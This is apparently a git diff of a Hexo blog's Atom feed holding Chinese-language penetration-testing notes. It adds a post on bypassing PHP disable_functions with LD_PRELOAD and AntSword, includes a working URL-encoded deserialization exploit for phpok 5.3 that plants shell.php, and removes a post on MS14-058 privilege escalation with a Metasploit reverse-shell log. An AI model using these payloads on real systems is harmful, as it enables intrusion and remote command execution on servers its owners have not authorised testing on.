@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-12-11T10:43:33.711Z</updated>
+  <updated>2019-12-25T09:15:06.645Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,13 +17,34 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>利用LD_PRELOAD绕过php中的disable_function</title>
+    <link href="http://yoursite.com/2019/12/25/%E5%88%A9%E7%94%A8LD-PRELOAD%E7%BB%95%E8%BF%87php%E4%B8%AD%E7%9A%84disable-function/"/>
+    <id>http://yoursite.com/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/</id>
+    <published>2019-12-25T08:59:01.000Z</published>
+    <updated>2019-12-25T09:15:06.645Z</updated>
+    
+    <content type="html"><![CDATA[<p>漏洞原理就不讲了，网上一大堆，这里直接讲利用的方式<br>利用前提：没有禁用putenv函数<br><a id="more"></a></p><h1 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h1><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>下载地址在这里，然后要上传一个php文件和一个用c编译出来的so文件<br>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass_disablefunc.c  -m32 -o bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure></p><p><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/success.png" alt></p><h1 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h1><p>蚁剑这里直接写了个插件利用<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/ant.png" alt></p><p>选择LD_PRELOAD模式<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/putenv.png" alt></p><p>点击开始<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/upload.png" alt><br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/antproxy.png" alt><br>会在当前目录下生成一个antproxy.php的文件，然后我们连上这个文件就可以发现可以执行命令啦~<br><img src="/2019/12/25/利用LD-PRELOAD绕过php中的disable-function/shell.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;漏洞原理就不讲了，网上一大堆，这里直接讲利用的方式&lt;br&gt;利用前提：没有禁用putenv函数&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+  </entry>
+  
+  <entry>
     <title>phpok5.x 反序列化漏洞</title>
     <link href="http://yoursite.com/2019/12/11/phpok5-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
     <id>http://yoursite.com/2019/12/11/phpok5-x-反序列化漏洞/</id>
     <published>2019-12-11T10:32:30.000Z</published>
-    <updated>2019-12-11T10:43:33.711Z</updated>
+    <updated>2019-12-25T08:59:50.305Z</updated>
     
-    <content type="html"><![CDATA[<p>最近一直想审个命令执行的漏洞，奈何太过于菜没思路，就一直在找分析的文章，吃完饭看见freebuf上发了一篇代码审计的文章，赶紧拉过来看看。<br><a id="more"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><a href="https://download.phpok.com/5.3.zip" target="_blank" rel="noopener">https://download.phpok.com/5.3.zip</a><br>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpok5.3/api.php?c=call&amp;f=index&amp;data=%7B%22m_picplayer%22%3A%7B%22site%22%3A1%2C%22type_id%22%3A%22format_ext_all%22%2C%220%22%3A%7B%22form_type%22%3A%22url%22%2C%22content%22%3A%22O%3A5%3A%5C%22cache%5C%22%3A4%3A%7Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000folder%5C%22%3Bs%3A41%3A%5C%22php%3A%5C%2F%5C%2Ffilter%5C%2Fwrite%3Dstring.rot13%5C%2Fresource%3D%5C%22%3Bs%3A11%3A%5C%22%5Cu0000%2A%5Cu0000key_list%5C%22%3Bs%3A19%3A%5C%22%3C%3Fcuc+cucvasb%28%29%3B+%3F%3E%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000key_id%5C%22%3Bs%3A5%3A%5C%22shell%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000status%5C%22%3Bb%3A1%3B%7D%22%7D%7D%7D</span><br></pre></td></tr></table></figure></p><p><a href="https://download.phpok.com/5.4.zip" target="_blank" rel="noopener">https://download.phpok.com/5.4.zip</a></p><p>可以直接打，真爽，打完之后会在根目录下生成一个shell.php<br><img src="/2019/12/11/phpok5-x-反序列化漏洞/phpok5-x-反序列化漏洞\shell.php" alt></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>]]></content>
+    <content type="html"><![CDATA[<p>最近一直想审个命令执行的漏洞，奈何太过于菜没思路，就一直在找分析的文章，吃完饭看见freebuf上发了一篇代码审计的文章，赶紧拉过来看看。<br><a id="more"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><a href="https://download.phpok.com/5.3.zip" target="_blank" rel="noopener">https://download.phpok.com/5.3.zip</a><br>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpok5.3/api.php?c=call&amp;f=index&amp;data=%7B%22m_picplayer%22%3A%7B%22site%22%3A1%2C%22type_id%22%3A%22format_ext_all%22%2C%220%22%3A%7B%22form_type%22%3A%22url%22%2C%22content%22%3A%22O%3A5%3A%5C%22cache%5C%22%3A4%3A%7Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000folder%5C%22%3Bs%3A41%3A%5C%22php%3A%5C%2F%5C%2Ffilter%5C%2Fwrite%3Dstring.rot13%5C%2Fresource%3D%5C%22%3Bs%3A11%3A%5C%22%5Cu0000%2A%5Cu0000key_list%5C%22%3Bs%3A19%3A%5C%22%3C%3Fcuc+cucvasb%28%29%3B+%3F%3E%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000key_id%5C%22%3Bs%3A5%3A%5C%22shell%5C%22%3Bs%3A9%3A%5C%22%5Cu0000%2A%5Cu0000status%5C%22%3Bb%3A1%3B%7D%22%7D%7D%7D</span><br></pre></td></tr></table></figure></p><p><a href="https://download.phpok.com/5.4.zip" target="_blank" rel="noopener">https://download.phpok.com/5.4.zip</a></p><p>可以直接打，真爽，打完之后会在根目录下生成一个shell.php<br><img src="/2019/12/11/phpok5-x-反序列化漏洞/phpok5-x-反序列化漏洞\shell.php" alt></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>lazy…….</p>]]></content>
     
     <summary type="html">
     
@@ -416,27 +437,6 @@
     
     
       <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MS14-058提权</title>
-    <link href="http://yoursite.com/2019/10/18/MS14-058%E6%8F%90%E6%9D%83/"/>
-    <id>http://yoursite.com/2019/10/18/MS14-058提权/</id>
-    <published>2019-10-18T05:04:10.000Z</published>
-    <updated>2019-10-18T05:35:04.660Z</updated>
-    
-    <content type="html"><![CDATA[<p>其实是本来想找一个提权windows 2008 R2的，在msf上尝试了很多无果<br><a id="more"></a><br><img src="/2019/10/18/MS14-058提权/msf.png" alt></p><p>secwiki上的<a href="https://github.com/SecWiki/windows-kernel-exploits" title="windows-kernel-exploits" target="_blank" rel="noopener">windows-kernel-exploits</a>找到了可利用的工具</p><p>这里测试了几个版本</p><p>windows server 2003 Standard x32<br><img src="/2019/10/18/MS14-058提权/02.png" alt><br>成功</p><p>windows server 2008 r2 x64<br><img src="/2019/10/18/MS14-058提权/08.png" alt><br>成功</p><p>windows7 Service Pack 1<br><img src="/2019/10/18/MS14-058提权/07.png" alt><br>失败</p><p>然后在msf寻找MS14-058的一个exp进行利用</p><p><img src="/2019/10/18/MS14-058提权/false.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 172.16.28.125:4444 </span><br><span class="line">[-] Exploit aborted due to failure: no-target: Session host is x64, but the target is specified as x86</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure></p><p>这里报了错误，看来msf也不是万能的</p><p>微软官网对此漏洞的介绍：<br><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN" title="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;其实是本来想找一个提权windows 2008 R2的，在msf上尝试了很多无果&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
     
   </entry>
   
